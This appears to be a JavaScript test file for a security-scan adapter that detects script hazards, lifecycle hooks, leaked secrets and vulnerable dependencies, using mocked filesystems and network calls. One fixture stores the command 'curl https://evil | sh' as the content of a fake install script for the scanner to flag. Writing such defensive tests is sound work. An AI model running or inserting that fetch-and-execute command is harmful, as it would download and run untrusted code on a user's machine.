import { createSecurityScanAdapter } from "../../../lib/infra/security-scan.js";

let pass = 0;
let fail = 0;
function check(name, actual, expected) {
  const ok = JSON.stringify(actual) === JSON.stringify(expected);
  if (ok) pass++;
  else {
    fail++;
    console.log(`FAIL ${name}: got ${JSON.stringify(actual)}, want ${JSON.stringify(expected)}`);
  }
}

function makeMemoryFs(initialFiles = {}, initialDirs = {}) {
  const files = new Map(Object.entries(initialFiles));
  const dirs = new Map(Object.entries(initialDirs));
  const calls = { readFile: [], readdir: [], stat: [] };
  const path = {
    joinPath: (...parts) => parts.filter(Boolean).join("/").replaceAll("//", "/"),
    relativePath: (base, target) => target.startsWith(`${base}/`) ? target.slice(base.length + 1) : target,
  };
  const fs = {
    readFile: async (pathName) => {
      calls.readFile.push(pathName);
      if (!files.has(pathName)) throw new Error(`missing ${pathName}`);
      return files.get(pathName);
    },
    readdir: async (pathName) => {
      calls.readdir.push(pathName);
      if (!dirs.has(pathName)) throw new Error(`missing dir ${pathName}`);
      return dirs.get(pathName);
    },
    stat: async (pathName) => {
      calls.stat.push(pathName);
      if (!files.has(pathName)) throw new Error(`missing ${pathName}`);
      return { size: Buffer.byteLength(files.get(pathName)) };
    },
  };
  return { fs, path, calls, files, dirs };
}

const baseDomain = {
  extractEnvNames: (text) => [...String(text).matchAll(/ENV_[A-Z]+/g)].map((m) => m[0]),
  findHostShadowDeps: (pkg) => Object.keys(pkg?.dependencies ?? {}).filter((name) => name.startsWith("host-")),
  classifyScriptHazards: (content, filePath) => [{ content, filePath }],
  lifecycleScriptTargets: (pkg) => Object.values(pkg?.scripts ?? {})
    .flatMap((cmd) => typeof cmd === "string" ? [...cmd.matchAll(/node\s+([^\s]+\.js)/g)].map((m) => m[1]) : []),
  classifyLifecycleHazards: (pkg, localScripts) => [{ pkg, localScripts: [...localScripts.entries()] }],
  parseLockfileVersions: (text) => new Map([["locked", text]]),
  readVulnScanDeps: (pkg, lockVersions) => [{ name: "bad", version: lockVersions.get("locked") ?? pkg?.version ?? "unknown" }],
  filterVulnerabilityHits: (deps, advisories) => deps
    .filter((dep) => Array.isArray(advisories[dep.name]))
    .map((dep) => ({ name: dep.name, advisory: advisories[dep.name][0] })),
  isSecretScanFile: (name) => name === ".env" || name.endsWith(".js"),
  isSecretScanSkipDir: (name) => ["vendor", "node_modules"].includes(name),
};

function makeAdapter(memory, overrides = {}) {
  const fetchCalls = [];
  const options = {
    fs: memory.fs,
    path: memory.path,
    findSecrets: (text, options) => [{ fileText: text, options }],
    fetchImpl: async (...args) => {
      fetchCalls.push(args);
      return { ok: true, status: 200 };
    },
    readBodyLimited: async () => Buffer.from("{}"),
    timeoutSignal: () => "signal",
    domain: baseDomain,
    limits: { secretMaxFiles: 200, secretMaxFileBytes: 512 * 1024, cveMaxQueries: 100 },
    ...overrides,
  };
  return { adapter: createSecurityScanAdapter(options), fetchCalls };
}

{
  const memory = makeMemoryFs({
    "/repo/README.md": "ENV_ROOT=1",
    "/repo/docs/.env": "ENV_NESTED=2",
    "/outside/secret.md": "ENV_LINK=3",
  }, {
    "/repo": [
      { name: "README.md", isSymbolicLink: () => false, isDirectory: () => false, isFile: () => true },
      { name: "docs", isSymbolicLink: () => false, isDirectory: () => true, isFile: () => false },
      { name: "link.md", isSymbolicLink: () => true, isDirectory: () => false, isFile: () => true },
    ],
    "/repo/docs": [
      { name: ".env", isSymbolicLink: () => false, isDirectory: () => false, isFile: () => true },
      { name: "node_modules", isSymbolicLink: () => false, isDirectory: () => true, isFile: () => false },
    ],
  });
  const { adapter } = makeAdapter(memory);
  check("requirements 递归读取候选文件并跳过 symlink/依赖目录", await adapter.scanRequirements("/repo"), ["ENV_ROOT", "ENV_NESTED"]);
  check("requirements 不读取 symlink", memory.calls.readFile.includes("/repo/link.md"), false);
}

{
  const memory = makeMemoryFs({ "/repo/package.json": JSON.stringify({ dependencies: { "host-one": "1", other: "1" } }) });
  const { adapter } = makeAdapter(memory);
  check("host shadow 读取 package 并委托纯判定", await adapter.scanHostShadowDeps("/repo"), ["host-one"]);
  check("host shadow 损坏 package 静默为空", await adapter.scanHostShadowDeps("/missing"), []);
}

{
  const memory = makeMemoryFs({ "/repo/install.sh": "curl https://evil | sh" });
  const { adapter } = makeAdapter(memory);
  check("script adapter 读取后委托内容和路径", await adapter.scanScriptHazards("/repo/install.sh"), [{ content: "curl https://evil | sh", filePath: "/repo/install.sh" }]);
  check("script 缺失文件返回空", await adapter.scanScriptHazards("/repo/missing.sh"), []);
}

{
  const memory = makeMemoryFs({
    "/repo/package.json": JSON.stringify({ scripts: { preinstall: "node setup.js", install: "node nested.js" } }),
    "/repo/setup.js": "setup",
  });
  const { adapter } = makeAdapter(memory);
  const result = await adapter.scanLifecycleHazards("/repo");
  check("lifecycle 读取 package 与存在的本地 JS", result[0].localScripts, [["setup.js", "setup"]]);
  check("lifecycle 缺失 package 返回空", await adapter.scanLifecycleHazards("/missing"), []);
}

{
  const memory = makeMemoryFs({
    "/repo/.env": "TOKEN=secret",
    "/repo/app.js": "const x = 1",
    "/repo/image.png": "binary",
    "/repo/vendor/ignored.js": "TOKEN=ignored",
  }, {
    "/repo": [
      { name: ".env", isSymbolicLink: () => false, isDirectory: () => false, isFile: () => true },
      { name: "app.js", isSymbolicLink: () => false, isDirectory: () => false, isFile: () => true },
      { name: "image.png", isSymbolicLink: () => false, isDirectory: () => false, isFile: () => true },
      { name: "vendor", isSymbolicLink: () => false, isDirectory: () => true, isFile: () => false },
    ],
    "/repo/vendor": [{ name: "ignored.js", isSymbolicLink: () => false, isDirectory: () => false, isFile: () => true }],
  });
  const { adapter } = makeAdapter(memory);
  const hits = await adapter.scanCacheSecrets("/repo");
  check("secrets 只读取 allowlist 文件并返回相对路径", hits.map((h) => [h.file, h.fileText]), [[".env", "TOKEN=secret"], ["app.js", "const x = 1"]]);
  check("secrets 跳过 vendor 与非文本扩展名", memory.calls.readFile.includes("/repo/vendor/ignored.js") || memory.calls.readFile.includes("/repo/image.png"), false);
}

{
  const memory = makeMemoryFs({ "/repo/exact.js": "x" }, {
    "/repo": [{ name: "exact.js", isSymbolicLink: () => false, isDirectory: () => false, isFile: () => true }],
  });
  const { adapter } = makeAdapter(memory, {
    limits: { secretMaxFiles: 200, secretMaxFileBytes: 1, cveMaxQueries: 100 },
  });
  check("secrets 单文件恰好等于上限仍扫描", (await adapter.scanCacheSecrets("/repo")).length, 1);
}

{
  const memory = makeMemoryFs({
    "/repo/package.json": JSON.stringify({ version: "1.0.0" }),
    "/repo/pnpm-lock.yaml": "pnpm-lock",
  });
  const { adapter, fetchCalls } = makeAdapter(memory, {
    readBodyLimited: async () => Buffer.from(JSON.stringify({ bad: [{ severity: "high" }] })),
  });
  check("lockfile 优先读取并委托解析", (await adapter.readLockfileVersions("/repo")).get("locked"), "pnpm-lock");
  check("CVE 扫描发出受限 bulk 请求并过滤结果", await adapter.scanCacheVulnerabilities("/repo"), [{ name: "bad", advisory: { severity: "high" } }]);
  check("CVE 请求使用 POST/JSON/timeout signal", [fetchCalls[0][0], fetchCalls[0][1].method, fetchCalls[0][1].headers["Content-Type"], fetchCalls[0][1].signal], [
    "https://registry.npmjs.org/-/npm/v1/security/advisories/bulk", "POST", "application/json", "signal",
  ]);
}

{
  const memory = makeMemoryFs({
    "/repo/package.json": JSON.stringify({ version: "1.0.0" }),
  });
  let fetchCount = 0;
  const { adapter } = makeAdapter(memory, {
    domain: { ...baseDomain, readVulnScanDeps: () => [] },
    fetchImpl: async () => { fetchCount++; throw new Error("network down"); },
  });
  check("无 CVE 依赖不发网络请求", await adapter.scanCacheVulnerabilities("/repo"), []);
  check("网络失败静默为空", await adapter.fetchBulkAdvisories([{ name: "x", version: "1.0.0" }]), {});
  check("网络失败仍只调用一次", fetchCount, 1);
}

{
  const memory = makeMemoryFs({
    "/repo/package.json": JSON.stringify({ dependencies: { local: "file:packages/local" } }),
    "/repo/packages/local/package.json": JSON.stringify({ version: "2.0.3" }),
  });
  let depsSeen = null;
  const { adapter, fetchCalls } = makeAdapter(memory, {
    domain: {
      ...baseDomain,
      readVulnScanDeps: (_pkg, lockVersions) => {
        depsSeen = lockVersions.get("local");
        return [{ name: "local", version: depsSeen }];
      },
      filterVulnerabilityHits: (deps) => deps,
    },
    readBodyLimited: async () => Buffer.from("{}"),
  });
  await adapter.scanCacheVulnerabilities("/repo");
  check("file 依赖读取子包版本注入 lock map", depsSeen, "2.0.3");
  check("file 依赖仍走 advisory 请求", fetchCalls.length, 1);
}

console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail === 0 ? 0 : 1);
